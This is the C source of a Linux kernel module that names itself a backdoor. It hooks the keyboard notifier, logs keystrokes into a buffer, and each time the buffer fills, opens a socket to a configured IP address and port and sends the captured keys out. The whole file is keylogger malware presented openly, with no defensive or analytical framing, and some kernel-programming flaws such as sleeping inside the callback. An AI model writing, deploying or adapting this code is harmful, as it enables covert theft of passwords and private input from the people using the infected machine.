#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/keyboard.h>
#include <linux/irq.h>
#include <linux/interrupt.h>
#include <linux/delay.h>

#include "backdoor.h"
#include "utils/networking.c"

static struct notifier_block keyboard_notifier_block = {
    .notifier_call = keyboard_notifier_callback,
};

// Keyboard stroke buffer
static char keystrokes[KEY_BUFFER_SIZE + 1] = ""; 

// Keyboard interrupt handler
irqreturn_t keyboard_interrupt_handler(int irq, void *dev_id) {
    static int32_t buffer_count = 0; // Counts how many chars have been logged.
    struct keyboard_notifier_param *param = dev_id;

    if (param && param->value) {
        uint32_t keycode = param->value;
        char key = (char) keycode; // Convert keycode to char

        keystrokes[buffer_count] = key;
        buffer_count = (buffer_count + 1)%KEY_BUFFER_SIZE;

        printk(KERN_INFO "Buffer: %s\n", keystrokes);
        printk(KERN_INFO "Buffer size: %d\n", buffer_count);

        if (buffer_count == 0) {
            msleep(2000);
            struct socket* sock = create_socket(IP_ADDRESS, PORT);
            printk(KERN_INFO "Created socket\n");
            msleep(5000);
            if (sock == NULL) {
                printk(KERN_INFO "Oh no, no connection\n");
                return IRQ_NONE;
            }
            
            send_message(sock, keystrokes);
            printk(KERN_INFO "Sent message\n");
            msleep(10000);
            shutdown_socket(sock);
            printk(KERN_INFO "Closed socket\n");
            msleep(10000);
        }
    }

    return IRQ_NONE;
}

// Keyboard notifier callback
int keyboard_notifier_callback(struct notifier_block *nblock, unsigned long code, void *_param) {
    struct keyboard_notifier_param *param = _param;

    if (code == KBD_KEYSYM && param && param->down) {
        // Call the keyboard interrupt handler
        keyboard_interrupt_handler(0, param);
    }

    return NOTIFY_OK;
}


static int __init keyboard_module_init(void) {
    int32_t result;

    // Register the keyboard notifier
    result = register_keyboard_notifier(&keyboard_notifier_block);
    if (result != 0) {
        printk(KERN_ERR "Failed to register keyboard notifier\n");
        return result;
    }

    printk(KERN_INFO "Backdoor module initialized\n");
    return 0;
}

static void __exit keyboard_module_exit(void) {
    // Unregister the keyboard notifier
    unregister_keyboard_notifier(&keyboard_notifier_block);

    printk(KERN_INFO "Backdoor module exited\n");
}

module_init(keyboard_module_init);
module_exit(keyboard_module_exit);
